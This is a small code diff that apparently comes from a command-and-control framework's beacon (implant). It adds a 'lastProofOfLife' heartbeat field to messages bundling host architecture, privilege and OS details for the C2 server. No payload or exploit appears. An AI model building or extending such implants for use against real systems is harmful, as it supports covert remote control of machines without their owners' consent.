@@ -320,6 +320,7 @@ bool Beacon::taskResultsToCmd(std::string& output)
 	bundleC2Message->set_arch(m_arch);
 	bundleC2Message->set_privilege(m_privilege);
 	bundleC2Message->set_os(m_os);
+	bundleC2Message->set_lastProofOfLife("0");
 
 	while(!m_taskResult.empty())
 	{
@@ -348,6 +349,7 @@ bool Beacon::taskResultsToCmd(std::string& output)
 			bundleC2Message->set_arch(ptr->getArch());
 			bundleC2Message->set_privilege(ptr->getPrivilege());
 			bundleC2Message->set_os(ptr->getOs());
+			bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());
 
 			C2Message c2Message = ptr->getTaskResult();
 			while(!c2Message.instruction().empty())
